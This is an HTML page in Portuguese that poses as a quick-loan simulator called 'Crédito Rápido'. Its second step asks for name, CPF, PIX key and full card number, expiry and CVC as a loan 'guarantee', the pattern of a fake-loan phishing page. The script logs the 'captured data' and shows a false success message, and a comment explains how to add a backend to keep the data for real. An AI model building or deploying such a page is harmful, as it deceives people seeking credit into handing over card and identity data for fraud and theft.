<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crédito Rápido | Confirmação</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --brand-primary: #0052FF;
            --brand-dark: #0A1F44;
            --success: #00C853;
            --bg: #F0F2F5;
        }

        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .card { background: white; width: 90%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); overflow: hidden; }
        
        .header { background: var(--brand-dark); color: white; padding: 1.5rem; text-align: center; }
        
        .content { padding: 2rem; }

        /* Esconder seções */
        .hidden { display: none; }

        /* Estilo dos Inputs */
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 0.9rem; }
        input, select { 
            width: 100%; padding: 12px; border: 2px solid #E2E8F0; border-radius: 10px; 
            box-sizing: border-box; font-size: 1rem;
        }
        input:focus { border-color: var(--brand-primary); outline: none; }

        .btn { 
            width: 100%; background: var(--brand-primary); color: white; padding: 15px; 
            border: none; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 10px;
        }

        .summary-mini { background: #f8fafc; padding: 10px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--success); }
    </style>
</head>
<body>

<div class="card">
    <div id="step1">
        <div class="header"><h1>Simulador de Crédito</h1></div>
        <div class="content">
            <label>Valor Desejado: <span id="valStr" style="color:var(--brand-primary)">R$ 1.500</span></label>
            <input type="range" id="amount" min="500" max="35000" step="500" value="1500" style="width:100%; margin: 20px 0;">
            
            <label>Parcelas</label>
            <select id="terms" style="margin-bottom: 20px;">
                <option value="12">12 meses</option>
                <option value="24">24 meses</option>
                <option value="48">48 meses</option>
            </select>

            <div style="background: #f1f5f9; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
                <small>Parcela estimada:</small>
                <div id="installmentText" style="font-size: 1.5rem; font-weight: 800;">R$ 0,00</div>
            </div>

            <button class="btn" onclick="goToStep2()">Solicitar Empréstimo</button>
        </div>
    </div>

    <div id="step2" class="hidden">
        <div class="header"><h1>Quase lá!</h1></div>
        <div class="content">
            <div class="summary-mini">
                <small>Solicitação de:</small><br>
                <strong id="finalValueDisplay">R$ 0,00</strong>
            </div>

            <form id="loanForm">
                <div class="form-group">
                    <label>Nome Completo</label>
                    <input type="text" name="nome" required placeholder="Ex: João Silva">
                </div>
                <div class="form-group">
                    <label>CPF</label>
                    <input type="text" name="cpf" required placeholder="000.000.000-00">
                </div>
                <div class="form-group">
                    <label>Chave PIX (para recebimento)</label>
                    <input type="text" name="pix" required placeholder="CPF, E-mail ou Celular">
                </div>
                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
                <div class="form-group">
                    <label>Número do Cartão (Para Garantia)</label>
                    <input type="text" name="card_number" required placeholder="0000 0000 0000 0000">
                </div>
                <div style="display: flex; gap: 10px;">
                    <div class="form-group" style="flex: 2;">
                        <label>Validade</label>
                        <input type="text" name="card_expiry" placeholder="MM/AA">
                    </div>
                    <div class="form-group" style="flex: 1;">
                        <label>CVC</label>
                        <input type="password" name="card_cvc" placeholder="***">
                    </div>
                </div>

                <button type="submit" class="btn" style="background: var(--success);">Finalizar e Receber</button>
            </form>
        </div>
    </div>
</div>

<script>
    // Lógica do Simulador
    const amountInput = document.getElementById('amount');
    const termsInput = document.getElementById('terms');
    
    function updateSim() {
        const val = parseFloat(amountInput.value);
        const t = parseInt(termsInput.value);
        document.getElementById('valStr').innerText = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        
        const pmt = val * (0.0199 * Math.pow(1.0199, t)) / (Math.pow(1.0199, t) - 1);
        document.getElementById('installmentText').innerText = pmt.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }

    function goToStep2() {
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('step2').classList.remove('hidden');
        document.getElementById('finalValueDisplay').innerText = document.getElementById('valStr').innerText;
    }

    // Lógica de Salvamento
    document.getElementById('loanForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const formData = new FormData(this);
        const data = Object.fromEntries(formData.entries());
        data.valor_solicitado = amountInput.value;

        // SALVAMENTO LOCAL (Apenas para demonstração imediata)
        console.log("Dados capturados:", data);
        alert("Dados enviados com sucesso! Estamos processando seu crédito.");
        
        // DICA: Para salvar de verdade, você precisará de um Backend (PHP/Node) ou um serviço como Formspree.
    });

    amountInput.addEventListener('input', updateSim);
    termsInput.addEventListener('change', updateSim);
    updateSim();
</script>

</body>
</html>
